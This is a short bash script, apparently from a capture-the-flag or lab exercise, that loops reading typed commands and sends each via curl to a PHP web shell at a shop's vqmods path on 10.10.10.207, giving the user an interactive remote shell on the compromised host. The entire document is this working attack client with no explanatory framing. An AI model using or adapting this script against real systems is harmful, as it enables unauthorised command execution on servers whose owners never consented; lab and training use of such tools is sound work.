#!/bin/bash

cmd=''
while [[ $cmd != 'exit'  ]];
do
    read -p '$ > ' cmd
    curl -X GET http://10.10.10.207/shop/vqmods/php-cmd.php --data-urlencode "cmd=$cmd" # URL to the webshell, "cmd=etc.."

done
